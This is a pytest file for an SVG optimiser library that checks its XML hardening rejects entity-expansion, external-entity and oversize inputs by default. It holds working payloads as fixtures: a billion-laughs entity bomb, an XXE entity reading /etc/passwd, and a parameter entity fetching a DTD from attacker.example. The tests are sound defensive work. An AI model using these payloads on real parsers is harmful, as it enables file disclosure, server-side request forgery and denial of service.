"""Tests for the secure-by-default XML hardening introduced in v1.0.

Covers Sprint 1, phases S1 (defusedxml hard dep) and S2 (input size limit).

Each test name documents the threat it guards against:

* ``test_billion_laughs_*`` — exponential entity expansion DoS.
* ``test_xxe_*`` — external entity / DTD reference (file disclosure, SSRF).
* ``test_oversize_*`` — refusal of inputs larger than ``max_input_bytes``.
* ``test_opt_in_*`` — verifies opt-out via ``allow_xml_entities`` works *and*
  that it emits :class:`~svg_polish.optimizer.SecurityWarning`.
"""

from __future__ import annotations

import warnings

import pytest

from svg_polish.exceptions import SvgPolishError, SvgSecurityError
from svg_polish.optimizer import SecurityWarning, generate_default_options, scour_string

# Canonical billion-laughs payload — small expansion factor so the test stays fast,
# but the entity-definition vector is structurally identical to the real attack.
BILLION_LAUGHS = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
]>
<svg xmlns="http://www.w3.org/2000/svg"><title>&lol3;</title></svg>
"""

# XXE: external general entity referencing the local filesystem.
XXE_FILE = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg"><title>&xxe;</title></svg>
"""

# DTD with a parameter-entity reference (another XXE variant).
XXE_PARAM = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % param SYSTEM "http://attacker.example/evil.dtd">
  %param;
]>
<svg xmlns="http://www.w3.org/2000/svg"/>
"""


class TestEntityHardening:
    """Inputs containing XML entity definitions are rejected by default."""

    def test_billion_laughs_rejected(self) -> None:
        with pytest.raises(SvgSecurityError) as excinfo:
            scour_string(BILLION_LAUGHS)
        # Generic message — must not echo the payload back.
        assert "lol" not in str(excinfo.value)

    def test_xxe_file_rejected(self) -> None:
        with pytest.raises(SvgSecurityError):
            scour_string(XXE_FILE)

    def test_xxe_param_entity_rejected(self) -> None:
        with pytest.raises(SvgSecurityError):
            scour_string(XXE_PARAM)

    def test_security_error_is_polish_error(self) -> None:
        """Consumers can catch the broader base class."""
        with pytest.raises(SvgPolishError):
            scour_string(BILLION_LAUGHS)


class TestEntityOptOut:
    """Opt-in path: explicit ``allow_xml_entities=True`` parses entities + warns."""

    def test_opt_in_billion_laughs_warns_and_parses(self) -> None:
        opts = generate_default_options()
        opts.allow_xml_entities = True
        with warnings.catch_warnings(record=True) as caught:
            warnings.simplefilter("always")
            result = scour_string(BILLION_LAUGHS, opts)
        assert any(issubclass(w.category, SecurityWarning) for w in caught), (
            "expected SecurityWarning when allow_xml_entities=True"
        )
        # Entity expansion happened; the title carries the expanded text.
        assert "lol" in result


class TestSizeLimit:
    """``max_input_bytes`` rejects oversize inputs before parsing."""

    def test_oversize_rejected_with_default(self) -> None:
        opts = generate_default_options()
        opts.max_input_bytes = 1024
        big = "<svg xmlns='http://www.w3.org/2000/svg'>" + ("x" * 2048) + "</svg>"
        with pytest.raises(SvgSecurityError) as excinfo:
            scour_string(big, opts)
        assert "max_input_bytes" in str(excinfo.value)

    def test_size_limit_disabled_via_negative(self) -> None:
        opts = generate_default_options()
        opts.max_input_bytes = -1
        # 200 KB SVG that would have been fine anyway, but exercises the no-limit path.
        big = "<svg xmlns='http://www.w3.org/2000/svg'>" + ("<g/>" * 50000) + "</svg>"
        result = scour_string(big, opts)
        assert "<svg" in result

    def test_size_limit_disabled_via_none(self) -> None:
        opts = generate_default_options()
        opts.max_input_bytes = None  # type: ignore[assignment]
        result = scour_string("<svg xmlns='http://www.w3.org/2000/svg'/>", opts)
        assert "<svg" in result

    def test_size_limit_counts_bytes_not_chars(self) -> None:
        """Multi-byte UTF-8 characters count as their byte length."""
        opts = generate_default_options()
        opts.max_input_bytes = 64
        # 32 multi-byte chars × 2 bytes each ≈ 64 bytes plus the SVG envelope → exceeds.
        envelope = "<svg xmlns='http://www.w3.org/2000/svg'><title>{}</title></svg>"
        big = envelope.format("é" * 64)
        with pytest.raises(SvgSecurityError):
            scour_string(big, opts)


class TestParseSecurityFromBytes:
    """The security checks must apply to bytes inputs as well."""

    def test_billion_laughs_bytes_rejected(self) -> None:
        with pytest.raises(SvgSecurityError):
            scour_string(BILLION_LAUGHS.encode("utf-8"))

    def test_oversize_bytes_rejected(self) -> None:
        opts = generate_default_options()
        opts.max_input_bytes = 100
        big = ("<svg xmlns='http://www.w3.org/2000/svg'>" + ("x" * 200) + "</svg>").encode()
        with pytest.raises(SvgSecurityError):
            scour_string(big, opts)
